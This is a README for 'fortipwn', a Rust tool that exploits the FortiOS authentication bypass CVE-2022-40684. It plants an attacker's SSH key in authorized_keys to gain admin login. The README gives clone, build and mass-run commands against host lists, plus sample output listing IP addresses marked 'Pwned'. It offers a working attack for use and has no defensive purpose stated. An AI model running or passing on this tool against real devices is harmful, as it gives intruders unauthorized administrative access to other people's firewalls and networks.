# fortipwn

Forti CVE-2022-40684 enumeration script built in Rust.

Uploads an SSH public key into authorized_keys, allowing an attacker to SSH into a server running FortiOS as admin.

# Usage
```console
./fortipwn <hosts.txt> <id_rsa.pub>
```

# Build
```console
git clone https://github.com/Grapphy/fortipwn/
cd fortipwn
cargo build --release
cd target/release/
./fortipwn <host.txt> <id_rsa.pub>
```

# Output
```console
$ ./fortipwn examples_ip.txt id_rsa.pub
Checking for 150 hosts. You might log-in through ssh as admin@host on pwned hosts.
Pwned: 210.29.110.143
Pwned: 144.14.71.122
Pwned: 21.220.10.82
Pwned: 163.123.102.32
Pwned: 121.159.192.10
Pwned: 162.49.194.19
Pwned: 185.92.20.40
Pwned: 194.19.211.19
Finished scanning
```
